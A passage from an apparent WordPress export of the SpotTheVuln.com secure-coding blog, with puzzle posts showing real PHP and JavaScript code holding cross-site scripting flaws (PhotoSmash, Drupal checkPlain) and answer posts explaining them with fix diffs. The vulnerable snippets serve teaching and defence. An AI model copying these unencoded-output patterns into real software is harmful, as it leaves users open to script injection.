			if (!empty($usage_list)) {
			?&gt;
				&lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;
				&lt;a href=&quot;#&quot; class=&quot;info&quot;&gt;&lt;?php echo $usage_list['text']?&gt;:&lt;span&gt;&lt;?php echo $usage_list['tooltip']?&gt;&lt;/span&gt;&lt;/a&gt;
				&lt;/td&gt;&lt;/tr&gt;
			&lt;?php
			}
		}
		?&gt;
	&lt;/tr&gt;
	&lt;/table&gt;
	&lt;/form&gt;
...snip...
&lt;/script&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1331</wp:post_id>
		<wp:post_date>2011-02-25 05:41:13</wp:post_date>
		<wp:post_date_gmt>2011-02-25 12:41:13</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>reasoning-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="consumption"><![CDATA[Consumption]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="freepbx"><![CDATA[FreePBX]]></category>
		<category domain="post_tag" nicename="html-encoding"><![CDATA[html encoding]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/fy2Oik]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c3c009f6685fd78a4325fc409779580c]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1704</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Cross-Site Scripting (XSS), FreePBX, PHP, Solution Vulnerability Code Example «SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2011/02/reasoning-cross-site-scripting/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2011-02-25 12:34:06</wp:comment_date>
			<wp:comment_date_gmt>2011-02-25 19:34:06</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Eva Miranda, netsecured. netsecured said: RT @spotthevuln2011New Post: Reasoning - Cross Site Scripting http://bit.ly/fy2Oik #secure #code #dev: [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1298662446.2525";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1298663320.0577";s:7:"message";s:45:"BrettH changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"BrettH";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Character</title>
		<link>http://spotthevuln.com/2011/02/character/</link>
		<pubDate>Mon, 28 Feb 2011 12:00:42 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1337</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Knowledge will give you power, but character respect.</strong> <br><strong>  - Bruce Lee
</strong></blockquote>
[sourcecode language="php"]
&lt;?php
...snip...
	//Get a link for the Start Slideshow for PicLens
	function getPicLensLink($g, $atts){
		if($atts['link_text']){
			$link_text = $atts['link_text'];
		} else {
			$link_text = 'Start Slideshow 
  &lt;img src=&quot;http://lite.piclens.com/images/PicLensButton.png&quot;
  alt=&quot;PicLens&quot; width=&quot;16&quot; height=&quot;12&quot; border=&quot;0&quot; align=&quot;absmiddle&quot;&gt;';
		}
		
		$picatts['id'] = $g['gallery_id'];
		$picatts['thumb_width'] = $g['thumb_width'];
		$picatts['thumb_height'] = $g['thumb_height'];
		$picatts['gallery_type'] = $g['gallery_type'];
		$picatts['images'] = $g['images'];
		$picatts['page'] = $g['page'];
		
		
		if($g['tags'] == 'post_tags'){
			$picatts['tags'] = $this-&gt;getPostTags(0);
		} else {
			$picatts['tags'] = $g['tags'];
		}
		
		$param_array = $this-&gt;filterMRSSAttsFromArray($picatts, &quot;&quot;);
		
		if( is_array($param_array)){
			$params = implode(&quot;&amp;&quot;, $param_array);
			//$params = urlencode($params);
		}
				
		$ret = '&lt;a class=&quot;piclenselink&quot; href=&quot;javascript:PicLensLite.start({feedUrl:\'' 
			.  plugins_url() . '/photosmash-galleries/bwbps-media-rss.php?'
			. $params . '\'});&quot;&gt;
			' . $link_text . ' &lt;/a&gt;
			';
			
		return $ret;
	}
	
	function getPostTags($post_id){
	
		if(!$post_id ){
			global $wp_query;
			$post_id = $wp_query-&gt;post-&gt;ID;
		}
		$terms = wp_get_object_terms( $post_id, 'post_tag', $args ) ;
		
		if(is_array($terms)){
		
			foreach( $terms as $term ){
				
				$_terms[] = $term-&gt;name;
			
			}
		
			unset($terms);
			if( is_array($_terms)){
				$ret = implode(&quot;,&quot; , $_terms);
			} else {
				$ret = &quot;&quot;;
			}
		}
	
		return $ret;	
	}
	
	
	/*		SECTION:  Media Uploader Integration
	 * 		Media Uploader Integration for Admin -&gt; Photo Manager uploading images
	 *
	*/	
	function mediaUAddGalleryFieldToMediaUploader(){
		if(isset($_REQUEST['bwbps_galid']) &amp;&amp; (int)$_REQUEST['bwbps_galid']){
		
			echo &quot;&lt;input type='hidden' id='bwbps_mediau_galid' name='bwbps_mediau_galid' value='&quot; . (int)$_REQUEST['bwbps_galid'] . &quot;' /&gt;
			&lt;input type='hidden' id='bwbps_galid' name='bwbps_galid' value='&quot; . (int)$_REQUEST['bwbps_galid'] . &quot;' /&gt;
			&lt;input type='hidden' name='bwbps_galname' value='&quot; . $_REQUEST['bwbps_galname'] . &quot;' /&gt;
			&lt;div style='background-color: #eaffdf; padding: 5px; border: 1px solid #a0a0a0; margin: 3px; font-size: 14px; color: #333;'&gt;Adding to PhotoSmash: &quot; . $_REQUEST['bwbps_galname'] . &quot;&lt;/div&gt;
			&quot;;
		
		} else {
		
			$gid = isset($_REQUEST['bwbps_mediau_galid']) ? (int)$_REQUEST['bwbps_mediau_galid'] : 0;
		
			$galleryDDL = $this-&gt;getGalleryDDL($gid, &quot;select gallery&quot;, &quot;&quot;, &quot;bwbps_mediau_galid&quot;, 30, true, true);
			echo &quot;&lt;div style='padding: 5px; margin: 3px; font-size: 14px; color: #333;'&gt;Add to PhotoSmash: $galleryDDL&lt;/div&gt;&quot;;
		}
	}
	
	function mediaUAddGalleryFieldToFlashUploader(){
		
			?&gt;
			&lt;script type=&quot;text/javascript&quot;&gt;
			
			if (typeof flashStartUploadFunctions == 'undefined'){

				var flashStartUploadFunctions = [];
				function addFlashStartUploadFunction( funct_name ){
					flashStartUploadFunctions.push( funct_name );
					
				}

				function runFlashStartUploadFunctions(){
					if( flashStartUploadFunctions.length &gt; 0 ){
						var bwbfunc;
						for( bwbfunc in flashStartUploadFunctions){
							
								eval(flashStartUploadFunctions[ bwbfunc ]);
							
						}
					}
				}

			}
			
			addFlashStartUploadFunction( 'bwbpsAddGalleryToFlashUploader();' );
			
				jQuery(window).load( function() {
					swfu.settings.upload_start_handler = function(){
						runFlashStartUploadFunctions();
					}
				});
				
				function bwbpsAddGalleryToFlashUploader(){
					jQuery('#bwbps_uploaded_images', top.document).show().append('&lt;h4&gt;Flash upload...preview not available.&lt;/h4&gt;');
					var gid = jQuery(&quot;#bwbps_mediau_galid_flash&quot;).val() + &quot;&quot;;

					if( gid ){
						swfu.addPostParam('bwbps_mediau_galid', gid);
						&lt;?php
						if(isset($_REQUEST['bwbps_galid']) ){
						?&gt;
						swfu.addPostParam('bwbps_galid', gid);
						&lt;?php 
						}
						?&gt;
					}	
				}
				
			&lt;/script&gt;
			&lt;?php
	
		if(isset($_REQUEST['bwbps_galid']) &amp;&amp; (int)$_REQUEST['bwbps_galid']){
			
			$this-&gt;count++;
			
			echo &quot;
			&lt;script type='text/javascript'&gt;
				jQuery(window).load( function() {
				//Hide the other Media Tabs
					jQuery('#tab-type_url').hide();
					jQuery('#tab-library').hide();&quot;;
			
...snip...
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1337</wp:post_id>
		<wp:post_date>2011-02-28 05:00:42</wp:post_date>
		<wp:post_date_gmt>2011-02-28 12:00:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>character</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/fj6TpK]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[0e1d4317444aae205baeea2dde5a2895]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1738</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PhotoSmash, PHP, Solution Vulnerability Code Example &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/03/character-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-03-04 05:02:45</wp:comment_date>
			<wp:comment_date_gmt>2011-03-04 12:02:45</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Character [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299240165.5714";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299479998.3566";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Flag</title>
		<link>http://spotthevuln.com/2011/03/flag/</link>
		<pubDate>Mon, 07 Mar 2011 14:00:15 +0000</pubDate>
		<dc:creator>psthomas</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1342</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Every normal man must be tempted, at times, to spit upon his hands, hoist the black flag, and begin slitting throats.
~H.L. Mencken</strong></blockquote>
[sourcecode language="javascript"]
/**
 * Encode special characters in a plain-text string for display as HTML.
 */
Drupal.checkPlain = function(str) {
  str = String(str);
  var replace = { '&amp;': '&amp;amp;', '&quot;': '&amp;quot;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;' };
  for (var character in replace) {
    str = str.replace(character, replace[character]);
  }
  return str;
};
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1342</wp:post_id>
		<wp:post_date>2011-03-07 07:00:15</wp:post_date>
		<wp:post_date_gmt>2011-03-07 14:00:15</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>flag</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[3]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Flag - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/03/flag-cross-site-scripting/</link>
		<pubDate>Fri, 11 Mar 2011 14:00:57 +0000</pubDate>
		<dc:creator>psthomas</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1354</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Drupal Core

Fixed in Version: 6.1

Issue Type: Cross Site Scripting (XSS)

Original Code: <a href="http://spotthevuln.com/2011/03/flag/">Found Here</a>
<h1>Details</h1>
This week's cross site scripting vulnerability is somewhat unusual in that it exists in javascript, rather than server side. The checkPlain function is used to output encode data fetched via Ajax/XHR (for instance, dynamically loading a new article). It seems to do the job, however the String.replace function in javascript only replaces the first instance by default; any additional instances of the character will remain intact.

The developer's fix is to set the global flag on the regex, so that all instances are replaced. When auditing code like this it would be wise carefully look upstream and check for other uses of the same data, where a different end use wasn't encoded. When designing a system, issues like this indicate the importance of a carefully planned and consistent input-escaping/output-encoding approach, so that missed occurrences are more apparent. In this case, the JS function here is used only by Drupal modules and plugins loading data via Ajax, and a parallel change was made in the Drupal PHP source to handle normal usage. That change called the standard PHP function check_plain to output encode the data on the back end.
<h1>Developers Solution</h1>
[sourcecode language="diff"]
/**
 * Encode special characters in a plain-text string for display as HTML.
 */
Drupal.checkPlain = function(str) {
  str = String(str);
  var replace = { '&amp;': '&amp;amp;', '&quot;': '&amp;quot;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;' };
  for (var character in replace) {
-    str = str.replace(character, replace[character]);
+    var regex = new RegExp(character, 'g');
+    str = str.replace(regex, replace[character]);
  }
  return str;
};
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1354</wp:post_id>
		<wp:post_date>2011-03-11 07:00:57</wp:post_date>
		<wp:post_date_gmt>2011-03-11 14:00:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>flag-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[3]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1762</wp:comment_id>
			<wp:comment_author><![CDATA[Nathan Christiansen]]></wp:comment_author>
			<wp:comment_author_email>nathanc@tni.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>66.236.69.66</wp:comment_author_IP>
			<wp:comment_date>2011-03-11 10:18:34</wp:comment_date>
			<wp:comment_date_gmt>2011-03-11 17:18:34</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[As long as the code is ONLY used for output filtering of AJAX type requests, the fix should work.

Since it is Javascript, it can be bypassed if the code is used to do input filtering before sending the data to the server.

The code is also insufficient to filter content embedded in the Initial HTML page load.

The best solution for output filtering is to do it on the web server while responding to either an HTML page load or an AJAX request.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299893967.0788";s:7:"message";s:47:"psthomas changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:8:"psthomas";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299863914.7019";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Character - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/03/character-cross-site-scripting/</link>
		<pubDate>Fri, 04 Mar 2011 12:00:29 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1375</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: PhotoSmash

Fixed in Version: 1.0.5

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Character" href="http://spotthevuln.com/2011/02/character/" target="_blank">Found    Here</a>
<h3>Description</h3>
Once again, we see the familiar pattern of the developer taking user/attacker controlled values and using those values to build HTML markup.  Line 76 is the start of a large echo statement which writes a couple input fields to markup.  The developer uses the $_REQUEST[‘bwbps_galname’] variable to populate the value attribute for one of the input form fields.  Although not completely clear from the code snippet, the developers addressed this issue by placing an encoded version of $_REQUEST[‘bwbps_galname’] into a variable named $gallery_name and using the newly encoded value to build the HTML markup.

Although not addressed by this patch, there are a couple of areas that deserve deeper inspection.  For example, on line 113 the application is calling a javascript eval on an unknown function.  If this function contains user/attacker supplied content, this could result in XSS.  Additionally, on line 136 it seems the user/attacker has some influence on variables passed to a SWF object.  If the SWF doesn’t have the appropriate logic to handle the tainted data, this could result in a security vulnerability.



<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="76-81,111,134-136"]
&lt;?php
...snip...
	//Get a link for the Start Slideshow for PicLens
	function getPicLensLink($g, $atts){
		if($atts['link_text']){
			$link_text = $atts['link_text'];
		} else {
			$link_text = 'Start Slideshow 
  &lt;img src=&quot;http://lite.piclens.com/images/PicLensButton.png&quot;
  alt=&quot;PicLens&quot; width=&quot;16&quot; height=&quot;12&quot; border=&quot;0&quot; align=&quot;absmiddle&quot;&gt;';
		}
		
		$picatts['id'] = $g['gallery_id'];
		$picatts['thumb_width'] = $g['thumb_width'];
		$picatts['thumb_height'] = $g['thumb_height'];
		$picatts['gallery_type'] = $g['gallery_type'];
		$picatts['images'] = $g['images'];
		$picatts['page'] = $g['page'];
		
		
		if($g['tags'] == 'post_tags'){
			$picatts['tags'] = $this-&gt;getPostTags(0);
		} else {
			$picatts['tags'] = $g['tags'];
		}
		
		$param_array = $this-&gt;filterMRSSAttsFromArray($picatts, &quot;&quot;);
		
		if( is_array($param_array)){
			$params = implode(&quot;&amp;&quot;, $param_array);
			//$params = urlencode($params);
		}
				
		$ret = '&lt;a class=&quot;piclenselink&quot; href=&quot;javascript:PicLensLite.start({feedUrl:\'' 
			.  plugins_url() . '/photosmash-galleries/bwbps-media-rss.php?'
			. $params . '\'});&quot;&gt;
			' . $link_text . ' &lt;/a&gt;
			';
			
		return $ret;
	}
	
	function getPostTags($post_id){
	
		if(!$post_id ){
			global $wp_query;
			$post_id = $wp_query-&gt;post-&gt;ID;
		}
		$terms = wp_get_object_terms( $post_id, 'post_tag', $args ) ;
		
		if(is_array($terms)){
		
			foreach( $terms as $term ){
				
				$_terms[] = $term-&gt;name;
			
			}
		
			unset($terms);
			if( is_array($_terms)){
				$ret = implode(&quot;,&quot; , $_terms);
			} else {
				$ret = &quot;&quot;;
			}
		}
	
		return $ret;	
	}
	
	
	/*		SECTION:  Media Uploader Integration
	 * 		Media Uploader Integration for Admin -&gt; Photo Manager uploading images
	 *
	*/	
	function mediaUAddGalleryFieldToMediaUploader(){
		if(isset($_REQUEST['bwbps_galid']) &amp;&amp; (int)$_REQUEST['bwbps_galid']){
		
			echo &quot;&lt;input type='hidden' id='bwbps_mediau_galid' name='bwbps_mediau_galid' value='&quot; . (int)$_REQUEST['bwbps_galid'] . &quot;' /&gt;
			&lt;input type='hidden' id='bwbps_galid' name='bwbps_galid' value='&quot; . (int)$_REQUEST['bwbps_galid'] . &quot;' /&gt;
-			&lt;input type='hidden' name='bwbps_galname' value='&quot; . $_REQUEST['bwbps_galname'] . &quot;' /&gt;
-			&lt;div style='background-color: #eaffdf; padding: 5px; border: 1px solid #a0a0a0; margin: 3px; font-size: 14px; color: #333;'&gt;Adding to PhotoSmash: &quot; . $_REQUEST['bwbps_galname'] . &quot;&lt;/div&gt;
+			&lt;input type='hidden' name='bwbps_galname' value='&quot; . $gallery_name . &quot;' /&gt; 
+			&lt;div style='background-color: #eaffdf; padding: 5px; border: 1px solid #a0a0a0; margin: 3px; font-size: 14px; color: #333;'&gt;Adding to PhotoSmash: &quot; . $gallery_name . &quot;&lt;/div&gt; 
			&quot;;
		
		} else {
		
			$gid = isset($_REQUEST['bwbps_mediau_galid']) ? (int)$_REQUEST['bwbps_mediau_galid'] : 0;
		
			$galleryDDL = $this-&gt;getGalleryDDL($gid, &quot;select gallery&quot;, &quot;&quot;, &quot;bwbps_mediau_galid&quot;, 30, true, true);
			echo &quot;&lt;div style='padding: 5px; margin: 3px; font-size: 14px; color: #333;'&gt;Add to PhotoSmash: $galleryDDL&lt;/div&gt;&quot;;
		}
	}
	
	function mediaUAddGalleryFieldToFlashUploader(){
		
			?&gt;
			&lt;script type=&quot;text/javascript&quot;&gt;
			
			if (typeof flashStartUploadFunctions == 'undefined'){

				var flashStartUploadFunctions = [];
				function addFlashStartUploadFunction( funct_name ){
					flashStartUploadFunctions.push( funct_name );
					
				}

				function runFlashStartUploadFunctions(){
					if( flashStartUploadFunctions.length &gt; 0 ){
						var bwbfunc;
						for( bwbfunc in flashStartUploadFunctions){
							
								eval(flashStartUploadFunctions[ bwbfunc ]);
							
						}
					}
				}

			}
			
			addFlashStartUploadFunction( 'bwbpsAddGalleryToFlashUploader();' );
			
				jQuery(window).load( function() {
					swfu.settings.upload_start_handler = function(){
						runFlashStartUploadFunctions();
					}
				});
				
				function bwbpsAddGalleryToFlashUploader(){
					jQuery('#bwbps_uploaded_images', top.document).show().append('&lt;h4&gt;Flash upload...preview not available.&lt;/h4&gt;');
					var gid = jQuery(&quot;#bwbps_mediau_galid_flash&quot;).val() + &quot;&quot;;

					if( gid ){
						swfu.addPostParam('bwbps_mediau_galid', gid);
						&lt;?php
						if(isset($_REQUEST['bwbps_galid']) ){
						?&gt;
						swfu.addPostParam('bwbps_galid', gid);
						&lt;?php 
						}
						?&gt;
					}	
				}
				
			&lt;/script&gt;
			&lt;?php
	
		if(isset($_REQUEST['bwbps_galid']) &amp;&amp; (int)$_REQUEST['bwbps_galid']){
			
			$this-&gt;count++;
			
			echo &quot;
			&lt;script type='text/javascript'&gt;
				jQuery(window).load( function() {
				//Hide the other Media Tabs
					jQuery('#tab-type_url').hide();
					jQuery('#tab-library').hide();&quot;;
			
...snip...
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1375</wp:post_id>
		<wp:post_date>2011-03-04 05:00:29</wp:post_date>
		<wp:post_date_gmt>2011-03-04 12:00:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>character-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="post_tag" nicename="javascript-eval"><![CDATA[javascript eval]]></category>
		<category domain="category" nicename="photosmash"><![CDATA[PhotoSmash]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1744</wp:comment_id>
			<wp:comment_author><![CDATA[bkrios]]></wp:comment_author>
